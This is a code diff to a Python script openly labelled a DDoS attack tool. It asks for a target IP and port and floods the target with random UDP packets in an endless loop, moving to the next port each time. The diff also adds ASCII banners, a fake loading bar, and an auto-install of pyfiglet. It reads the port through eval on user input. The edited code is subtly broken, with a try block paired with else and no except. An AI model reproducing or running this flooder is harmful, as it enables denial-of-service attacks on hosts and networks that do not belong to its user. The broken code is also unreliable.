@@ -3,64 +3,45 @@ import os
 import time
 import socket
 import random
-# from pyfiglet import Figlet
-#Code Time
+import math
 from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
 
-##############
+try: # not native
+  from pyfiglet import Figlet
+else:
+    os.system('pip3 install pyfiglet==0.7')
+    from pyfiglet import Figlet
+
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-#############
 
-os.system("cls") # clear for linux
-# os.system("figlet DDos Attack") # figlet for linux
+os.system("clear")
+f = Figlet(font='slant')
+print (f.renderText('DDoS Attack'))
 
-# me
-# f = Figlet(font='slant') for windows
-# print (f.renderText('DDos Attack')) for windows
+print ("Author : AlexandreZT")
+print ("GitHub : https://github.com/AlexandreZT")
 
-print
-print ("Author   : HA-MRX")
-print ("You Tube : https://www.youtube.com/c/HA-MRX")
-print ("github   : https://github.com/Ha3MrX")
-print ("Facebook : https://www.facebook.com/muhamad.jabar222")
-print
-ip = raw_input("IP Target : ") # raw_input
-port = input("Port       : ")
+ip = input("IP Target : ")
+port = eval(input("Port       : "))
 
-os.system("cls") # clear for linux
-# os.system("figlet Attack Starting") # figlet for linux
+# loadind ~10s
+for i in range (1, 101, 1):
+  os.system("cls")
+  f = Figlet(font='slant')
+  print (f.renderText('Attack Loading'))
+  print("["+"="*int(math.ceil(i/5))+"]", "{0}%".format(i,))
+  time.sleep(0.1)
 
-# me
-# f = Figlet(font='slant')
-# print (f.renderText('Attack Starting')) 
-
-# usless
-print ("[                    ] 0% ")
-time.sleep(5)
 os.system("cls")
-print ("[=====               ] 25%")
-time.sleep(5)
-os.system("cls")
-print ("[==========          ] 50%")
-time.sleep(5)
-os.system("cls")
-print ("[===============     ] 75%")
-time.sleep(5)
-os.system("cls")
-print ("[====================] 100%")
-time.sleep(5)
-os.system("cls")
+f = Figlet(font='slant')
+print (f.renderText('FIRE !!')) 
+time.sleep(2)
 
 sent = 0
+
 while True:
-     sock.sendto(bytes, (ip, port)) # sock.sendto(bytes, (ip,port)) sur linux
+     sock.sendto(bytes, (ip, port))
      sent = sent + 1
      port = port + 1
      print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
